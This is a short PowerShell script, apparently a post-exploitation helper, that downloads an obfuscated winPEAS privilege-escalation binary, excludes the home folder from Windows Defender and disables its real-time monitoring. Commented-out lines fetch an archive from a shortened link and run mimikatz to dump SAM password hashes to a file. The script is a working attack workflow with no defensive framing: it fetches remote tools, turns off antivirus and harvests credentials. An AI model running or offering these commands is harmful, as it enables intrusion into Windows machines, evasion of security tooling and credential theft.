$url = "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASany.exe?raw=true"
$output = "~/peas.exe"
Invoke-WebRequest -Uri $url -OutFile $output

Set-MpPreference -ExclusionPath ~
Write-Output "[+] Excluded Path from Windows Defender"

Set-MpPreference -DisableRealTimeMonitoring $true
Write-Output "[+] Disabled Windows Defender"

#$url = "https://bit.ly/3cjpdSp"
#$output = "~\good_files_promise.zip"
#Invoke-WebRequest -Uri $url -OutFile $output

#Expand-Archive ~\good_files_promise.zip
#Write-Output "[+] Good files downloaded and extracted"

#Write-Output "[+] Pulling down hashes"
#cd .\good_files_promise\x64

#.\mimikatz.exe token::elevate lsadump::sam exit >> hashes.txt
#mv hashes.txt ..\..\..\hashes.txt


